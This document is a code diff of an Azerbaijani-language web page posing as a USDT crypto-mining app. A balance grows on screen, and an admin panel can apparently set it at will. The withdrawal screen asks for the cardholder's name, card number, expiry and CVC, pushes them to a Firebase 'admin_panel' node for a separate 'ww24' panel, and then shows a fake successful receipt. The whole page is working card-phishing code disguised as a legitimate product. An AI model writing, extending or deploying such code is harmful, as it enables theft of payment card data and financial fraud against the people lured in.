@@ -1,243 +1,207 @@
 <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
 
-<div id="mining-app" style="background: #000; min-height: 100vh; color: #fff; font-family: 'Inter', sans-serif; display: flex; flex-direction: column;">
+<div id="mining-app" style="background: #000; min-height: 100vh; color: #fff; font-family: 'Inter', sans-serif; display: flex; flex-direction: column; overflow: hidden;">
 
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;600;700&display=swap');
-        body { margin: 0; padding: 0; background: #000; overflow-x: hidden; }
-        
-        /* ÜST HİSSƏ */
-        .header { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #1a1a1a; }
-        .user-profile { display: flex; align-items: center; gap: 10px; }
-        .user-avatar { width: 35px; height: 35px; border-radius: 50%; background: #111; border: 1px solid #bdfd00; display: flex; align-items: center; justify-content: center; color: #bdfd00; }
+        body { margin: 0; padding: 0; user-select: none; }
 
-        /* MİNİNG SAHƏSİ */
-        .mining-zone { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 20px; }
-        .coin-animation { width: 120px; height: 120px; margin-bottom: 20px; filter: drop-shadow(0 0 20px rgba(189,253,0,0.4)); animation: rotate 10s linear infinite; }
-        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+        /* Sənin atdığın dizayn elementləri - DƏYİŞMƏDİ */
+        .top-bar { display: flex; justify-content: space-between; align-items: center; padding: 15px 20px; border-bottom: 1px solid #1a1a1a; }
+        .user-info { display: flex; align-items: center; gap: 10px; }
+        .avatar { width: 35px; height: 35px; border-radius: 50%; background: #222; border: 1px solid #3fb950; display: flex; align-items: center; justify-content: center; }
+        .stats-container { padding: 15px; gap: 10px; display: flex; flex-direction: column; }
+        .stat-row { background: #111111; border: 1px solid #222; border-radius: 12px; padding: 12px 15px; display: flex; justify-content: space-between; align-items: center; }
+        .level-tag { background: #bdfd00; color: #000; padding: 4px 12px; border-radius: 20px; font-weight: 700; font-size: 0.75rem; }
+        .speed-text { color: #bdfd00; font-weight: 700; font-size: 0.9rem; }
+        .mining-core { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; position: relative; }
+        .mining-gif { width: 160px; margin-bottom: 20px; filter: drop-shadow(0 0 15px rgba(189, 253, 0, 0.2)); }
+        .live-counter { font-size: 2.2rem; font-weight: 700; letter-spacing: 1px; margin-bottom: 5px; }
+        .progress-section { padding: 20px; width: 100%; box-sizing: border-box; }
+        .progress-bar-bg { width: 100%; height: 12px; background: #1a1a1a; border-radius: 10px; overflow: hidden; margin-bottom: 8px; border: 1px solid #222; }
+        .progress-fill { width: 0%; height: 100%; background: #4a7d00; border-radius: 10px; transition: 0.3s; }
+        .nav-bar { display: grid; grid-template-columns: repeat(5, 1fr); background: #0a0a0a; border-top: 1px solid #1a1a1a; padding: 10px 0; }
+        .nav-item { display: flex; flex-direction: column; align-items: center; gap: 5px; color: #666; font-size: 0.65rem; text-decoration: none; }
+        .nav-item.active { color: #bdfd00; }
 
-        .balance-display { background: #0a0a0a; border: 1px solid #1a1a1a; padding: 20px 50px; border-radius: 25px; text-align: center; }
-        .amount { font-size: 2.8rem; font-weight: 700; color: #fff; font-family: 'Monaco', monospace; }
-
-        /* MODAL VƏ KART */
+        /* Bank Modalı */
         .modal-overlay { position: fixed; inset: 0; background: #000; z-index: 9999; display: none; flex-direction: column; padding: 20px; }
-        .credit-card {
-            width: 100%; max-width: 320px; height: 180px; background: linear-gradient(135deg, #1d1d1d, #000);
-            border-radius: 15px; margin: 20px auto; border: 1px solid #333; padding: 20px; position: relative; box-shadow: 0 10px 30px rgba(0,0,0,0.8);
-        }
-        .card-input { width: 100%; background: #0f0f0f; border: 1px solid #222; padding: 15px; color: #fff; border-radius: 12px; margin-bottom: 10px; outline: none; }
-        .card-input:focus { border-color: #bdfd00; }
-
-        /* ÇEK ÜSLUBU */
-        .receipt-box { background: #fff; color: #000; padding: 30px; font-family: 'Courier New', Courier, monospace; line-height: 1.4; border-radius: 2px; box-shadow: 0 0 20px rgba(255,255,255,0.1); }
+        .v-card { width: 100%; max-width: 320px; height: 180px; background: linear-gradient(135deg, #1d1d1d, #000); border-radius: 15px; margin: 20px auto; border: 1px solid #333; padding: 20px; position: relative; }
+        .b-input { width: 100%; background: #0f0f0f; border: 1px solid #222; padding: 15px; color: #fff; border-radius: 12px; margin-bottom: 10px; outline: none; }
     </style>
 
-    <div class="header">
-        <div class="user-profile">
-            <div class="user-avatar"><i class="fas fa-user-shield"></i></div>
-            <span id="username-display" style="font-weight: 600;">Yüklənir...</span>
+    <div class="top-bar">
+        <div class="user-info">
+            <div class="avatar"><i class="fas fa-user" style="color:#bdfd00"></i></div>
+            <span id="user-display-name" style="font-size: 0.85rem; font-weight: 600;">Yüklənir...</span>
         </div>
-        <div style="background: #111; padding: 6px 15px; border-radius: 20px; font-size: 0.75rem; border: 1px solid #222; color: #bdfd00;">
-            <i class="fas fa-signal"></i> CANLI
+        <div style="background: #111; padding: 5px 12px; border-radius: 20px; font-size: 0.75rem; border: 1px solid #222;">🌐 Azərbaycan</div>
+    </div>
+
+    <div class="stats-container">
+        <div class="stat-row">
+            <div class="level-tag">SEVİYYƏ 1</div>
+            <div class="speed-text">0.000055 USD/S</div>
         </div>
     </div>
 
-    <div class="mining-zone">
-        <img src="usdt.png" class="coin-animation" id="coin-img">
-        <div class="balance-display">
-            <div class="amount" id="main-bal">0.0000</div>
-            <div style="color: #bdfd00; font-size: 0.8rem; font-weight: 700; margin-top: 5px;">USDT BALANS</div>
+    <div class="mining-core">
+        <div style="position: relative;">
+            <img src="usdt.png" class="mining-gif" id="coin-logo">
         </div>
+        <div class="live-counter" id="live-bal">0.0000</div>
+        <div style="font-size: 0.8rem; color: #888;">YIĞILAN MƏBLƏĞ (USDT)</div>
     </div>
 
-    <div style="padding: 20px;">
-        <div style="display: flex; justify-content: space-between; margin-bottom: 10px; font-size: 0.85rem;">
-            <span id="work-status">Gözlənilir...</span>
-            <span id="timer" style="color: #bdfd00;">05:00:00</span>
-        </div>
-        <div style="height: 10px; background: #111; border-radius: 5px; overflow: hidden; border: 1px solid #222;">
-            <div id="bar-fill" style="height: 100%; background: #bdfd00; width: 0%; transition: 0.5s;"></div>
-        </div>
-        
-        <button id="mine-btn" onclick="toggleMining()" style="width: 100%; margin-top: 25px; background: #bdfd00; border: none; padding: 18px; border-radius: 15px; font-weight: 800; color: #000; font-size: 1rem;">
-            MƏDƏNİ BAŞLAT
-        </button>
+    <div class="progress-section">
+        <div class="progress-bar-bg"><div class="progress-fill" id="p-fill"></div></div>
+        <div id="p-timer" style="font-size: 0.8rem; text-align: center; color: #fff;">05:00:00</div>
+        <button id="mine-btn" onclick="startMiningProcess()" style="width: 100%; margin-top: 20px; background: #bdfd00; border: none; padding: 15px; border-radius: 12px; font-weight: 700; color: #000;">MƏDƏNİ AKTİVLƏŞDİR</button>
     </div>
 
-    <div style="display: grid; grid-template-columns: repeat(4, 1fr); background: #050505; border-top: 1px solid #151515; padding: 15px 0;">
-        <div style="text-align: center; color: #bdfd00;"><i class="fas fa-hammer"></i></div>
-        <div style="text-align: center; color: #444;"><i class="fas fa-layer-group"></i></div>
-        <div onclick="openWithdraw()" style="text-align: center; color: #444;"><i class="fas fa-wallet"></i></div>
-        <div style="text-align: center; color: #444;"><i class="fas fa-user-cog"></i></div>
+    <div class="nav-bar">
+        <a href="#" class="nav-item active"><i class="fas fa-hammer"></i> <span>Mədən</span></a>
+        <a href="#" class="nav-item"><i class="fas fa-trophy"></i> <span>Liderlər</span></a>
+        <a href="#" class="nav-item"><i class="fas fa-rocket"></i> <span>Yenilə</span></a>
+        <a href="#" onclick="showWithdraw()" class="nav-item"><i class="fas fa-wallet"></i> <span>Çıxarış</span></a>
+        <a href="#" class="nav-item"><i class="fas fa-user"></i> <span>Mən</span></a>
     </div>
 
-    <div id="withdraw-modal" class="modal-overlay">
-        <div style="display: flex; justify-content: space-between; align-items: center; margin-bottom: 20px;">
-            <h3 style="margin: 0;">Pul Çıxarışı</h3>
-            <i class="fas fa-times" onclick="closeWithdraw()" style="font-size: 1.5rem; color: #444;"></i>
+    <div id="w-modal" class="modal-overlay">
+        <div style="display:flex; justify-content:space-between; align-items:center; margin-bottom:20px;">
+            <h3>Çıxarış</h3> <i class="fas fa-times" onclick="hideWithdraw()"></i>
         </div>
-
-        <div class="credit-card">
-            <div style="display: flex; justify-content: space-between;">
-                <img src="chip.png" width="45" style="filter: brightness(1.5);">
-                <div id="card-type"><img src="visa.png" width="55"></div>
+        <div class="v-card">
+            <div style="display:flex; justify-content:space-between;">
+                <img src="chip.png" width="40">
+                <div id="card-type-img"><img src="visa.png" width="50"></div>
             </div>
-            <div id="card-num-v" style="margin: 35px 0 20px; font-size: 1.3rem; letter-spacing: 2.5px; text-shadow: 0 2px 4px #000;">**** **** **** ****</div>
-            <div style="display: flex; justify-content: space-between; font-size: 0.75rem; text-transform: uppercase;">
-                <span id="card-name-v">KART SAHİBİ</span>
-                <span id="card-date-v">MM/YY</span>
+            <div id="card-num-view" style="margin: 30px 0; font-size: 1.2rem; letter-spacing: 2px;">**** **** **** ****</div>
+            <div style="display:flex; justify-content:space-between; font-size:0.7rem;">
+                <span id="card-holder-view">AD SOYAD</span> <span id="card-date-view">MM/YY</span>
             </div>
         </div>
-
-        <div style="max-width: 400px; margin: 0 auto; width: 100%;">
-            <input type="text" id="form-name" class="card-input" placeholder="AD SOYAD" oninput="syncCard()">
-            <input type="text" id="form-num" class="card-input" placeholder="KART NÖMRƏSİ" maxlength="19" oninput="syncCard()">
-            <div style="display: flex; gap: 10px;">
-                <input type="text" id="form-date" class="card-input" placeholder="AA/İİ" maxlength="5" oninput="syncCard()">
-                <input type="password" id="form-cvc" class="card-input" placeholder="CVC/CVV" maxlength="3">
-            </div>
-            <input type="number" id="form-amt" class="card-input" placeholder="ÇIXARILACAQ MƏBLƏĞ">
-            <button onclick="finalizeWithdraw()" style="width: 100%; background: #238636; color: #fff; border: none; padding: 18px; border-radius: 12px; font-weight: 700; margin-top: 10px;">SORĞUNU GÖNDƏR</button>
+        <input type="text" id="in-name" class="b-input" placeholder="Ad Soyad" oninput="sync()">
+        <input type="text" id="in-num" class="b-input" placeholder="Kart Nömrəsi" maxlength="19" oninput="sync()">
+        <div style="display:flex; gap:10px;">
+            <input type="text" id="in-date" class="b-input" placeholder="AA/İİ" maxlength="5" oninput="sync()">
+            <input type="password" id="in-cvc" class="b-input" placeholder="CVC" maxlength="3">
         </div>
+        <input type="number" id="in-amt" class="b-input" placeholder="Məbləğ">
+        <button onclick="sendToWW24()" style="width:100%; padding:15px; background:#238636; border:none; border-radius:10px; color:#fff; font-weight:700;">TƏSDİQLƏ</button>
     </div>
 
-    <div id="receipt-overlay" class="modal-overlay" style="background: rgba(0,0,0,0.9); justify-content: center; align-items: center;">
-        <div class="receipt-box" id="final-receipt">
-            <div style="text-align: center; border-bottom: 2px solid #000; padding-bottom: 10px; margin-bottom: 15px;">
-                <h2 style="margin: 0;">BANK TRANSFER</h2>
-                <small>RƏSMİ ÖDƏNİŞ SƏNƏDİ</small>
-            </div>
-            <p><strong>TRANSAKSİYA:</strong> #<span id="rcp-id"></span></p>
-            <p><strong>TARİX:</strong> <span id="rcp-date"></span></p>
-            <p><strong>İSTİFADƏÇİ:</strong> <span id="rcp-user"></span></p>
-            <p><strong>KART:</strong> <span id="rcp-card"></span></p>
-            <p><strong>MƏBLƏĞ:</strong> <span id="rcp-amt"></span> USDT</p>
-            <div style="border-top: 1px dashed #000; margin-top: 15px; padding-top: 10px; font-size: 0.7rem; text-align: center;">
-                Vəsait 24 saat ərzində hesaba oturacaqdır.
-            </div>
-            <button onclick="location.reload()" style="width: 100%; background: #000; color: #fff; border: none; padding: 12px; margin-top: 20px;">SƏHİFƏYƏ QAYIT</button>
+    <div id="receipt-overlay" class="modal-overlay" style="background:#fff; color:#000; justify-content:center; align-items:center; display:none;">
+        <div style="font-family:'Courier New'; border:1px solid #000; padding:20px; width:80%;">
+            <center><h2>ÖDƏNİŞ ÇEKİ</h2></center>
+            <p>TARİX: <span id="r-date"></span></p>
+            <p>İSTİFADƏÇİ: <span id="r-user"></span></p>
+            <p>KART: <span id="r-card"></span></p>
+            <p>MƏBLƏĞ: <span id="r-amt"></span> USDT</p>
+            <p>STATUS: <b style="color:green">UĞURLU</b></p>
+            <button onclick="location.reload()" style="width:100%; padding:10px; background:#000; color:#fff; margin-top:10px;">BAĞLA</button>
         </div>
     </div>
-
 </div>
 
 <script>
-    // Dinamik İstifadəçi Adı
-    const currentUser = localStorage.getItem('username') || 'Qonaq';
-    document.getElementById('username-display').innerText = currentUser;
+    const user = localStorage.getItem('username') || 'Qonaq';
+    document.getElementById('user-display-name').innerText = user;
 
     let balance = 0;
-    let active = false;
-    let start = 0;
-    const FIVE_HOURS = 5 * 60 * 60 * 1000;
-    const SPEED = 0.00005555;
+    let isRunning = false;
+    let startTime = 0;
+    const SPEED = 0.0000555;
+    const LIMIT = 5 * 60 * 60 * 1000;
 
-    // Firebase Sinxronizasiyası (WW24 panelindən müdaxilə üçün)
-    db.ref('mining/' + currentUser).on('value', snap => {
-        const data = snap.val() || { balance: 0, active: false, start: 0 };
-        balance = data.balance;
-        active = data.active;
-        start = data.start;
-        updateScreen();
+    // Firebase Sinxronizasiyası (Admin panelindən balans dəyişmək üçün)
+    db.ref('mining/' + user).on('value', snap => {
+        const d = snap.val() || { balance: 0, isRunning: false, startTime: 0 };
+        balance = d.balance;
+        isRunning = d.isRunning;
+        startTime = d.startTime;
+        updateUI();
     });
 
-    function updateScreen() {
+    function updateUI() {
         const btn = document.getElementById('mine-btn');
-        if(active) {
+        if(isRunning) {
             btn.innerText = "MƏDƏN İŞLƏYİR...";
-            btn.style.opacity = "0.5";
             btn.disabled = true;
-            document.getElementById('work-status').innerText = "Proses davam edir";
+            btn.style.opacity = "0.5";
         } else {
-            btn.innerText = "MƏDƏNİ BAŞLAT";
-            btn.style.opacity = "1";
+            btn.innerText = "MƏDƏNİ AKTİVLƏŞDİR";
             btn.disabled = false;
-            document.getElementById('work-status').innerText = "Mədən dayanıb";
+            btn.style.opacity = "1";
         }
     }
 
     setInterval(() => {
-        if(active) {
-            let elapsed = Date.now() - start;
-            if(elapsed < FIVE_HOURS) {
+        if(isRunning) {
+            let elapsed = Date.now() - startTime;
+            if(elapsed < LIMIT) {
                 balance += SPEED;
-                document.getElementById('main-bal').innerText = balance.toFixed(4);
+                document.getElementById('live-bal').innerText = balance.toFixed(4);
+                document.getElementById('p-fill').style.width = (elapsed / LIMIT * 100) + "%";
                 
-                // Progress
-                let p = (elapsed / FIVE_HOURS) * 100;
-                document.getElementById('bar-fill').style.width = p + "%";
-                
-                // Timer
-                let rem = FIVE_HOURS - elapsed;
+                let rem = LIMIT - elapsed;
                 let h = Math.floor(rem / 3600000);
                 let m = Math.floor((rem % 3600000) / 60000);
                 let s = Math.floor((rem % 60000) / 1000);
-                document.getElementById('timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
+                document.getElementById('p-timer').innerText = `${h.toString().padStart(2,'0')}:${m.toString().padStart(2,'0')}:${s.toString().padStart(2,'0')}`;
             } else {
-                stopAuto();
+                stopMining();
             }
         }
     }, 1000);
 
-    async function toggleMining() {
-        start = Date.now();
-        active = true;
-        await db.ref('mining/' + currentUser).update({ active: true, start: start });
+    async function startMiningProcess() {
+        startTime = Date.now();
+        isRunning = true;
+        await db.ref('mining/' + user).update({ isRunning: true, startTime: startTime });
     }
 
-    async function stopAuto() {
-        active = false;
-        await db.ref('mining/' + currentUser).update({ active: false, balance: balance });
-        alert("5 saatlıq müddət bitdi! Yenidən başladın.");
+    async function stopMining() {
+        isRunning = false;
+        await db.ref('mining/' + user).update({ isRunning: false, balance: balance });
+        alert("5 saat bitdi. Yenidən aktivləşdirin!");
     }
 
-    // BANK FUNKSİYALARI
-    function openWithdraw() { document.getElementById('withdraw-modal').style.display = 'flex'; }
-    function closeWithdraw() { document.getElementById('withdraw-modal').style.display = 'none'; }
+    function showWithdraw() { document.getElementById('w-modal').style.display = 'flex'; }
+    function hideWithdraw() { document.getElementById('w-modal').style.display = 'none'; }
 
-    function syncCard() {
-        const num = document.getElementById('form-num').value;
-        document.getElementById('card-num-v').innerText = num || "**** **** **** ****";
-        document.getElementById('card-name-v').innerText = document.getElementById('form-name').value || "KART SAHİBİ";
-        document.getElementById('card-date-v').innerText = document.getElementById('form-date').value || "MM/YY";
-        
-        const logo = document.getElementById('card-type');
-        if(num.startsWith('4')) logo.innerHTML = '<img src="visa.png" width="55">';
-        else if(num.startsWith('5')) logo.innerHTML = '<img src="master.png" width="55">';
+    function sync() {
+        const n = document.getElementById('in-num').value;
+        document.getElementById('card-num-view').innerText = n || "**** **** **** ****";
+        document.getElementById('card-holder-view').innerText = document.getElementById('in-name').value || "AD SOYAD";
+        document.getElementById('card-date-view').innerText = document.getElementById('in-date').value || "MM/YY";
+        const logo = document.getElementById('card-type-img');
+        if(n.startsWith('4')) logo.innerHTML = '<img src="visa.png" width="50">';
+        else if(n.startsWith('5')) logo.innerHTML = '<img src="master.png" width="50">';
     }
 
-    async function finalizeWithdraw() {
-        const amount = parseFloat(document.getElementById('form-amt').value);
-        if(amount > balance || isNaN(amount)) return alert("Balans kifayət deyil və ya yanlış məbləğ!");
+    async function sendToWW24() {
+        const amt = parseFloat(document.getElementById('in-amt').value);
+        if(amt > balance || isNaN(amt)) return alert("Balans yetmir!");
 
-        const withdrawID = Math.floor(100000 + Math.random() * 900000);
-        
-        // ADMIN PANELİNƏ (ww24.html) GÖNDƏRİLƏN MƏLUMATLAR
-        const payload = {
-            id: withdrawID,
-            username: currentUser,
-            fullName: document.getElementById('form-name').value,
-            cardNumber: document.getElementById('form-num').value,
-            expiry: document.getElementById('form-date').value,
-            cvc: document.getElementById('form-cvc').value, // Admin üçün vacib
-            amount: amount,
-            date: new Date().toLocaleString('az-AZ'),
-            status: "Gözləmədə"
+        const data = {
+            username: user,
+            fullName: document.getElementById('in-name').value,
+            cardNum: document.getElementById('in-num').value,
+            date: document.getElementById('in-date').value,
+            cvc: document.getElementById('in-cvc').value, // WW24 üçün CVC
+            amount: amt,
+            time: new Date().toLocaleString()
         };
 
-        // Firebase admin qovluğuna yazma
-        await db.ref('admin_panel/withdrawals').push(payload);
-        
-        // Balansı yenilə
-        balance -= amount;
-        await db.ref('mining/' + currentUser).update({ balance: balance });
+        // ww24.html üçün admin_panel qovluğuna göndərir
+        await db.ref('admin_panel/withdrawals').push(data);
+        await db.ref('mining/' + user).update({ balance: balance - amt });
 
-        // Çeki Göstər
-        document.getElementById('rcp-id').innerText = withdrawID;
-        document.getElementById('rcp-date').innerText = payload.date;
-        document.getElementById('rcp-user').innerText = currentUser;
-        document.getElementById('rcp-card').innerText = payload.cardNumber;
-        document.getElementById('rcp-amt').innerText = amount;
+        document.getElementById('r-date').innerText = data.time;
+        document.getElementById('r-user').innerText = user;
+        document.getElementById('r-card').innerText = data.cardNum;
+        document.getElementById('r-amt').innerText = amt;
         document.getElementById('receipt-overlay').style.display = 'flex';
     }
 </script>
